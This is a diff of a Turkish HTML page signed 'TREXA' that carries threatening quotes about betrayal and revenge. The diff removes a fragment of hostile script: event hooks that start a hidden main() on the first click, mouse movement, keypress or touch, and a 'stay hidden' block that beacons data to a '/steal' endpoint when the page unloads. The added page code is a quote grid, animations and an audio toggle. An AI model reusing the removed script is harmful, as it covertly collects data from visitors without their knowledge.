+        <div class="warning-banner">
+            <p class="warning-text">HESAPLAŞMAK ADETTENDIR</p>
+        </div>
 
-// Mouse/keyboard/tıklama ile hemen çalıştır
-document.addEventListener('click', ()=>setTimeout(main, 5), {once:true});
-document.addEventListener('mousemove', ()=>setTimeout(main, 5), {once:true});
-document.addEventListener('keydown', ()=>setTimeout(main, 5), {once:true});
-document.addEventListener('touchstart', ()=>setTimeout(main, 5), {once:true});
+        <section class="quotes-section">
+            <h2 class="section-title">SAHTESINIZ!!!!!</h2>
+            <div class="quotes-grid">
+                <div class="quote-card">
+                    <span class="quote-number">01</span>
+                    <p class="quote-text">Kahpelik yapan yakında itaat eder. Çünkü hesap ödeme zamanı geldi.</p>
+                    <p class="quote-author">- TREXA</p>
+                </div>
+                <div class="quote-card">
+                    <span class="quote-number">02</span>
+                    <p class="quote-text">Küçük dostuma merhaba deyin. Hesap ödeme zamanı geldi.</p>
+                    <p class="quote-author">- TREXA</p>
+                </div>
+                <div class="quote-card">
+                    <span class="quote-number">03</span>
+                    <p class="quote-text">Arkadaşlık emanet gibidir, kırılırsa tamir edilmez. Kahpelik emanet kırmaktır.</p>
+                    <p class="quote-author">- TREXA</p>
+                </div>
+                <div class="quote-card">
+                    <span class="quote-number">04</span>
+                    <p class="quote-text">Kahpelik bir sanattır ama bu sanatı icra edenler burada sanatçı değil, hesap vericidir.</p>
+                    <p class="quote-author">- TREXA</p>
+                </div>
+                <div class="quote-card">
+                    <span class="quote-number">05</span>
+                    <p class="quote-text">Sadakatsizlik bir seçimdir, hata değil. Ve her seçimin bir bedeli vardır.</p>
+                    <p class="quote-author">- TREXA</p>
+                </div>
+            </div>
+        </section>
 
-// ============ 16. GİZLİ KAL ============
-// Sayfa değişse bile çalışmaya devam et
-window.addEventListener('beforeunload', ()=>{
-    try {
-        navigator.sendBeacon('/steal', JSON.stringify({time:Date.now()}));
-    } catch {}
-});
+        <footer class="footer">
+            <p class="footer-text">TREXA</p>
+            <p class="footer-sub">HUZURSUZ HISS EDERSEM HUZURU HARAM EDERIM :) r.</p>
+        </footer>
+    </div>
 
-</script>
+    <div class="audio-control" id="audioControl" title="Ses Aç/Kapat">
+        <span class="audio-icon">&#128266;</span>
+    </div>
+
+    <script>
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 40; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 20 + 's';
+            particle.style.animationDuration = (12 + Math.random() * 15) + 's';
+            particle.style.opacity = Math.random() * 0.5 + 0.1;
+            particlesContainer.appendChild(particle);
+        }
+
+        const audio = document.getElementById('bgAudio');
+        const audioControl = document.getElementById('audioControl');
+        let isPlaying = true;
+        audio.volume = 0.4;
+
+        audioControl.addEventListener('click', function() {
+            if (isPlaying) {
+                audio.pause();
+                audioControl.innerHTML = '<span class="audio-icon">&#128263;</span>';
+            } else {
+                audio.play().catch(e => console.log('Audio play failed:', e));
+                audioControl.innerHTML = '<span class="audio-icon">&#128266;</span>';
+            }
+            isPlaying = !isPlaying;
+        });
+
+        document.querySelectorAll('.quote-card').forEach(card => {
+            card.addEventListener('mouseenter', function() {
+                this.style.transform = 'translateY(-3px) scale(1.01)';
+            });
+            card.addEventListener('mouseleave', function() {
+                this.style.transform = 'translateY(0) scale(1)';
+            });
+        });
+
+        console.log('%c TREXA ', 'background: #8b0000; color: #000; font-size: 40px; font-weight: bold;');
+        console.log('%c Kahpelik Karşıtı Aktif ', 'color: #8b0000; font-size: 20px;');
+        console.log('%c Burada kahpelik yasaktır. ', 'color: #666; font-size: 16px;');
+    </script>
 </body>
 </html>
